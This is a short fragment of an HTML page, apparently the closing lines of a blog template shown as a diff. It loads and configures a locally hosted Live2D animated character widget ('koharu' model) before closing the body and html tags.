+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
